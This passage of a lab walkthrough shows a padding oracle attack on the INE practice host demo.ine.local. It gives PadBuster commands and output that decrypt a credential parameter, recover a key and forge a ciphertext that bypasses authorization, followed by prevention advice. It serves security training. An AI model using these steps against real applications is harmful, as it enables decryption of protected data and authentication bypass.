referrerPolicy="no-referrer"/><pre id="b252848a-b13e-4a12-8c6a-71f5166c44a3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">padbuster &quot;http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80&quot; &quot;6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80&quot; 16 -encoding 1
+</code></pre><p id="7ade2e3a-c292-43e8-88cb-cb61ed87347b" class="">The following are the options provided to the PadBuster tool:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bc4edd0e-2f1d-433a-98fa-ff52368c90b6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- The target URL containing the ciphertext
+- The ciphertext itself
+- Block size (128 bits = 16 bytes)
+- Encoding type 1 = lowercase hex (which was confirmed by experimenting with the endpoint in the previous step)
+</code></pre><p id="f078dd25-113f-4774-acba-a28f7d749620" class="">You would be prompted with the following message:</p><p id="fcba07e0-5643-451b-b712-25ac2007a792" class="">Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended :</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f53bc802-f9e6-4ade-9c1c-559f264ac1b8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Enter 2.
+</code></pre><blockquote id="2a448364-9b92-4339-9886-fb871db5ea45" class="">Padbuster was able to recover two blocks of the plaintext message:</blockquote><p id="e06c6cf4-3a73-4ef6-96e9-aec2f03abd54" class="">Block 1 Results:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f4b4cc64-0119-42c1-8b2c-05a7e92551a0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[+] Cipher Text (HEX): b8f1335522753d45174435c16b52dc2e
+[+] Intermediate Bytes (HEX): 0a0b2bcd40ec8741c671cc45c25ae140
+[+] Plain Text: ame=user&amp;Passwor
+</code></pre><p id="fc44a23d-f716-43c6-990b-fd51836b0e95" class="">Block 2 Results:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6d4bec5e-2859-4a23-a060-2f1f9004be8e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[+] Cipher Text (HEX): 5bbd4363b9d91d4c9100beae6ce34e80
+[+] Intermediate Bytes (HEX): dccc4030511450201f4c3dc9635ad426
+[+] Plain Text: d=sesame
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68aef0c7-c6d6-48ef-8ddb-159510fb93e3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Decrypted value: ame=user&amp;Password=sesame
+</code></pre><p id="6530d219-bc5c-4fee-a9f0-68178bcb606b" class="">PadBuster revealed that behind the encrypted string, there is the <strong>ame=user&amp;Password=sesame</strong> string.</p><p id="0315cfe9-0bb2-47d5-b144-df9dcb832898" class="">However, if you take a look at the decrypted blocks, they are just 2/3 of the entire ciphertext.</p><p id="b1afb255-c96a-4409-8dd6-3fbab09102ee" class="">The first part, which is equal to 1/3 of the length, was not decrypted. It may contain other parameters or the full name of the first parameter.</p><blockquote id="c4fc9a5f-fb9a-483a-a1d8-a3d7b2d28f73" class="">This happened because the first block is XOR’d with the initialization vector (IV), which is not known to us.</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3b1dd9ef-be6c-4a9d-8072-b17b7722f7c4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Image Source: https://samsclass.info/141/proj/p11pad9.png
+</code></pre><blockquote id="13a96da9-842f-47c3-abec-9058df090289" class="">To get the first block, we would need the IV.</blockquote><p id="44f5eb4d-167d-432b-9c7c-f56a8c8ac2ef" class="">Step 8: Recreate the missing parameter and obtain the key.</p><p id="a939bb74-fd5e-49a7-933e-461d05298111" class="">Visit the /check endpoint and provide the ciphertext, and it will give back the complete details about the encrypted string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="45c01f39-e927-42c2-a442-2305fce1a5ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre><p id="ffe5aff8-7ca2-4727-b961-9d27f92c7afe" class="">The decrypted as well as the parsed content is shown in the response.</p><ul id="ab494514-1853-4772-8a45-6dedaed106ea" class="bulleted-list"><li style="list-style-type:disc">We now know that the full parameter name is ApplicationUsername. This should be the content of the first, previously not decrypted, block 6b664ef0359fe233e021ad36b12d8e32.</li></ul><p id="1a866ae2-fd10-4b5f-880c-cd7cd40897c1" class="">So far, we know that we have three blocks:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f7e0dc9c-68fd-4566-b71c-348434d57a9a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">6b664ef0359fe233e021ad36b12d8e32 -&gt; ApplicationUsern
+b8f1335522753d45174435c16b52dc2e -&gt; ame=user&amp;Passwor
+5bbd4363b9d91d4c9100beae6ce34e80 -&gt; d=sesame
+</code></pre><blockquote id="c52f37a7-b151-49a8-a75d-1af5cbee6b22" class="">To obtain the key, we need to run Padbuster with the following arguments:</blockquote><p id="b98faeed-8452-48a6-b818-10f2d87b6d29" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d13b45e8-5821-4d68-8804-13987e9a0d9c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">padbuster &quot;http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32&quot; &quot;6b664ef0359fe233e021ad36b12d8e32&quot; 16 -encoding 1 -error &quot;ApplicationUsername missing&quot; -prefix &quot;6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e&quot; -noiv
+</code></pre><p id="dd30f35d-cfee-4841-8614-5afaa42a54c7" class="">The reason for these arguments is the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="40493133-3abb-4918-a86b-12e9aa5c3509" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- We use just the first block of the whole encrypted string - the one that was not decrypted
+- Next, we specify 16 bytes as the block size and lowercase hex encoding
+- error tells the application what string to look for in the response page to treat it as the error (we could have identified that error message by requesting something like http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34eff and the response would indicate of the invalid padding)
+- noiv is used to get the intermediate value after decrypting the first block.
+</code></pre><p id="2f4d73ad-997b-4b13-957a-430029ad4a87" class="">Obtaining the key will look as follows:</p><p id="09b7d43f-6a80-433a-beb4-1274d3158075" class="">Block 1 Results:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="70f6d39d-7c76-4cac-98a7-74333c6571a5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[+] Cipher Text (HEX): 6b664ef0359fe233e021ad36b12d8e32
+[+] Intermediate Bytes (HEX): 221449095f050045505c5e671003460d
+[+] Plain Text: &quot;I      _EP\^gF
+</code></pre><p id="5970cf0b-01b9-4a6b-8a0c-29679c3b18fe" class="">Step 10: Retrieving the signing key.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="51e7cc9b-d9e4-4897-95ba-5c6cf73317a2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">To get the key, we need to XOR the hex representation of the ciphertext (Intermediate bytes - hex for &quot;I _EP\^gF) with the hex representation of &quot;ApplicationUsern&quot;, which is 0x4170706c69636174696f6e557365726e.
+
+# Visit a XOR calculator website like https://xor.pw:
+</code></pre><p id="9c5b6abd-4b27-44f7-8000-2b99e269e6aa" class="">Provide the following hex values in the input fields:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7a7b8fb4-cee6-4c9d-8368-f21edac876a6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Input 1: 4170706c69636174696f6e557365726e
+Input 2: 221449095f050045505c5e671003460d
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d81f61e-f159-4402-9698-061b113ac193" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">The result is 0x63643965366661313933303263663463, which translates to cd9e6fa19302cf4c in ASCII (coverted using https://www.rapidtables.com/convert/number/hex-to-ascii.html):
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="15fa6778-63d8-47cb-b53f-4b84f79fbee8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Signing Key: cd9e6fa19302cf4c
+</code></pre><p id="d05a439b-3207-4896-a9e2-07c527ae34ea" class="">Step 11: Craft a custom username and password.</p><p id="091dd5f6-008f-46e8-b2f9-cd8c31fac650" class="">To make the application receive <strong>authorization</strong> as the username and <strong>bypass</strong> as the password, we would provide similar arguments to PadBuster, as before, like the ones set to obtain the encryption key.</p><ul id="4a559c06-544b-4927-af5f-f10a52c9d17e" class="bulleted-list"><li style="list-style-type:disc">PadBuster’s base will be the first block with the prefix and the same error indicator. The only addition is padding to the plaintext to close the “previous” argument when encrypting (we need data in the below format):</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6392f7d1-08dd-4e0a-a166-95f7972c6b25" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Application_garbage_data=xyz&amp;ApplicationUsername=authorization&amp;Password=bypass
+</code></pre><p id="41e03641-af94-47a1-99e6-94f1fb98c205" class="">Note that <strong>=xyz</strong> can be replaced with =anything&amp; as we just want to <strong>close</strong> the first argument in the GET request. Otherwise, all the encrypted data would be understood by the application as the value of the previous parameter and would not be treated as username and password values:</p><p id="548a480c-7405-46ca-aee9-4c50d6a3e6fa" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6d3376d0-2119-45ce-9003-b9de24a0b7f0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">padbuster &quot;http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32&quot; &quot;6b664ef0359fe233e021ad36b12d8e32&quot; 16 -encoding 1 -error &quot;ApplicationUsername missing&quot; -prefix &quot;6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e&quot; -plaintext &quot;=xyz&amp;ApplicationUsername=authorization&amp;Password=bypass&quot;
+</code></pre><p id="c8bd06a9-b8c8-4877-879e-41f885a59464" class="">Once the tool finishes its work, you should get back the following output:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2354f5e9-b011-4118-bda6-c30fc872116e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[+] Encrypted value is: 5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000
+</code></pre><p id="c9548f7b-73d6-48a5-b2b3-7ab5efc06898" class="">Step 12: Confirm the modification done to the username and the password.</p><p id="0ba72538-ae69-49de-aea7-35ebcd34fb83" class="">Send the encrypted value for authentication, to the /check endpoint:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8f2faf85-d5e1-4641-a983-e666ec8155c4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local/check?cipher=5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000
+</code></pre><blockquote id="b7f43ae9-8221-468c-a618-fdc18280f6a3" class="">We can see that the application correctly recognized the forged username and password. In a real-life scenario, the ability to tamper with insufficiently encrypted data might result in an effective authorization bypass.</blockquote><p id="d64f052d-ad90-4939-9ffe-8edc10d67377" class="">Root Cause:</p><p id="560cc2bc-e495-4b9b-96d8-e95866b52845" class="">The padding oracle attack is meant to illustrate the idea that something as innocuous as revealing whether the padding is valid or not can reveal a lot of information when abused in the right context.</p><p id="22c60840-0571-4906-bab5-8230d6321448" class="">Prevention:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ddc5497a-a9d8-48fc-8cf6-872ffa6e1685" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Use GCM/No Padding rather than CBC Padding mode.
+- Catch all decryption errors and return generic messages instead of reporting specific padding errors.
+- Implement Encrypt-then-MAC. In case a cipher arriving at the server was tampered with,
+  it will be dropped before any padding information is leaked.
+- Limit requests coming from the same source.
+</code></pre><p id="48d852ce-b161-4084-b146-2ffc4a5d1ea1" class="">Reference: https://www.youtube.com/watch?v=lkPBTJ3yiCI</p><h3 id="f1dc985c-e9cb-4bb8-b090-79f86bc0eea3" class=""><strong>References</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#references"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="82e0c167-3477-4f27-9f10-6c7bca566c19" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://github.com/AonCyberLabs/PadBuster
+- https://www.youtube.com/watch?v=lkPBTJ3yiCI</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
